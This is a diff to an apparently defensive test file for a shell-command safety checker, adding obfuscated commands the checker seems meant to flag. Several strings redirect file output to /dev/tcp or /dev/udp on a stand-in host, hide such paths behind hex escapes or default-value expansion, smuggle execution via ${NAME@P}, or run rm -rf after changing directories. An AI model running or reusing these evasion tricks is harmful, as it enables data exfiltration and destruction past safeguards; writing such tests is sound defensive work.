@@ -647,6 +647,9 @@ class StructuralAskTest(unittest.TestCase):
             "./grep 'rm -rf' notes.md", "grep 'rm -rf' ${ cat list; }", "cat 'rm -rf' ${|example-tool; }",
             "grep 'rm -rf' ${(e)NAME}", "grep 'rm -rf' notes.md > /dev/tcp/example.invalid/80",
             "grep 'rm -rf' notes.md 3>/dev/udp/example.invalid/53 >&3",
+            "printf -v NAME '%s' x; grep 'rm -rf' ${NAME@P}", "grep \"It's ${NAME@P}\" 'rm -rf' notes.md",
+            "grep 'rm -rf' notes.md > $'\\x2fdev/tcp/example.invalid/80'", "grep 'rm -rf' notes.md | tee $OUT",
+            "grep 'rm -rf' notes.md | tee > ${OUT:-/dev/tcp/example.invalid/80}",
             "cd $TMPDIR/run && rm -rf ../x", "cd $TMPDIR/run && cd ~ && rm -f a", "cd /srv/run && rm -f a",
             "for f in a b; do f=$(cat x); cat $f; done", "for f in $(ls); do cat $f; done; echo \"$(date)\"",
         ]:
